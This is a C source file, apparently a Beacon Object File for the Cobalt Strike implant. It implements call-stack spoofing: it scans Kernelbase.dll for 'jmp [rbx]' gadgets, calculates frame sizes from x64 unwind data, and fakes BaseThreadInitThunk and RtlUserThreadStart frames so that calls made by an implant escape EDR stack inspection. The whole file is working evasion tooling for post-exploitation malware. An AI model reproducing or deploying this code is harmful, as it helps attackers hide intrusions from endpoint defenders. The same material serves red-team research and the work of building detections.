#include <windows.h>

#include "Ntdll.h"
#include "Vulcan.h"
#include "Beacon.h"
#include "Bofdefs.h"
#include "Prototypes.h"

BOOL GetTextSectionSize(
	_In_	PVOID	pModule, 
	_Inout_	PDWORD	pdwVirtualAddress, 
	_Inout_	PDWORD	pdwSize
)
{
	PIMAGE_DOS_HEADER pImgDosHeader = (PIMAGE_DOS_HEADER)(pModule);
	if (pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImgNtHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)pModule + pImgDosHeader->e_lfanew);
	if (pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_SECTION_HEADER   pImgSectionHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);

	for (int i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
	{
		if (MSVCRT$strcmp((char*)pImgSectionHeader[i].Name, (char*)".text") == 0)
		{
			*pdwVirtualAddress = pImgSectionHeader[i].VirtualAddress;
			*pdwSize = pImgSectionHeader[i].SizeOfRawData;
			return TRUE;
		}
	}

	return FALSE;
}

PVOID FindGadget(
	_In_	PVOID	pModuleAddr
)
{
	DWORD	dwTextSectionSize = 0;
	DWORD	dwTextSectionVa = 0;
    PVOID   pGadgetList[10] = { 0 };
    DWORD   dwCounter = 0;

	if (!
		GetTextSectionSize(pModuleAddr, &dwTextSectionVa, &dwTextSectionSize)
		)
		return NULL;


	PVOID pModTextSection = (PBYTE)((UINT_PTR)pModuleAddr + dwTextSectionVa);
	for (int i = 0; i < (dwTextSectionSize - 2); i++)
	{
		if (
			((PBYTE)pModTextSection)[i] == 0xFF &&
			((PBYTE)pModTextSection)[i + 1] == 0x23
			)
		{
  			pGadgetList[dwCounter] = (void*)((UINT_PTR)pModTextSection + i);
            dwCounter++;
            if(dwCounter == 10)
                break;
            
		}
	}

    ULONG seed = 0x1337;
    ULONG randomnNbr = RtlRandomEx(&seed);
    randomnNbr %= dwCounter;
    
	return pGadgetList[randomnNbr];
}

void* CalculateFunctionStackSize(
    _In_    PRUNTIME_FUNCTION pRuntimeFunction, 
    _In_    const DWORD64 ImageBase
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };

    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            stackFrame.totalStackSize += 8;
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = TRUE;
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            stackFrame.setsFramePointer = TRUE;
            break;
        default:
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }

    stackFrame.totalStackSize += 8;

    return (void*)stackFrame.totalStackSize;
Cleanup:
    return NULL;
}

void* CalculateFunctionStackSizeWrapper(
    _In_    PVOID   ReturnAddress
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return NULL;
}

BOOL InitFrameInfo(
    _In_	PSYNTHETIC_STACK_FRAME	stackFrame
)
{
    void* pModuleFrame1 = GetModuleHandleA("Kernel32.dll");
    void* pModuleFrame2 = GetModuleHandleA("Ntdll.dll");
    void* pModuleGadget = GetModuleHandleA("Kernelbase.dll");

    if (
        !pModuleFrame1 || !pModuleFrame2 || !pModuleGadget
        )
        return FALSE;

    stackFrame->frame1.pModuleAddr = pModuleFrame1;
    stackFrame->frame1.pFunctionAddr = (PVOID)GetProcAddress((HMODULE)pModuleFrame1, "BaseThreadInitThunk");
    stackFrame->frame1.dwOffset = 0x14;

    stackFrame->frame2.pModuleAddr = pModuleFrame2;
    stackFrame->frame2.pFunctionAddr = (PVOID)GetProcAddress((HMODULE)pModuleFrame2, "RtlUserThreadStart");
    stackFrame->frame2.dwOffset = 0x21;

    if (
        !stackFrame->frame1.pFunctionAddr || !stackFrame->frame2.pFunctionAddr
        )
        return FALSE;


	stackFrame->pGadget = pModuleGadget;	// jmp [rbx]
   
    if (!stackFrame->pGadget)
        return FALSE;

    return TRUE;
}


PVOID   SpoofCall(
    _In_    PSYNTHETIC_STACK_FRAME  stackFrame,
    _In_    PVOID   pFunctionAddr,
    _In_    PVOID   pArg1,
    _In_    PVOID   pArg2,
    _In_    PVOID   pArg3,
    _In_    PVOID   pArg4,
    _In_    PVOID   pArg5,
    _In_    PVOID   pArg6,
    _In_    PVOID   pArg7,
    _In_    PVOID   pArg8,
    _In_    PVOID   pArg9,
    _In_    PVOID   pArg10,
    _In_    PVOID   pArg11,
    _In_    PVOID   pArg12
)
{
    PRM param = { 0 };

    param.trampoline = stackFrame->pGadget;

    void* ReturnAddress = (void*)((UINT_PTR)stackFrame->frame1.pFunctionAddr + stackFrame->frame1.dwOffset);
    param.BTIT_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
    param.BTIT_retaddr = ReturnAddress;

    if (!param.BTIT_ss || !param.BTIT_retaddr)
        return NULL;

    ReturnAddress = (void*)((UINT_PTR)stackFrame->frame2.pFunctionAddr + stackFrame->frame2.dwOffset);
    param.RUTS_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
    param.RUTS_retaddr = ReturnAddress;

    if (!param.RUTS_ss || !param.RUTS_retaddr)
        return NULL;

    do
    {
        param.trampoline = FindGadget(stackFrame->pGadget);
        param.Gadget_ss = CalculateFunctionStackSizeWrapper(param.trampoline);
    } 
    while(param.Gadget_ss == NULL);

    if (!param.trampoline || !param.Gadget_ss)
        return NULL;

    void* retVal = SpoofStub(pArg1, pArg2, pArg3, pArg4, &param, pFunctionAddr, 8, pArg5, pArg6, pArg7, pArg8, pArg9, pArg10, pArg11, pArg12);
    return retVal;
}

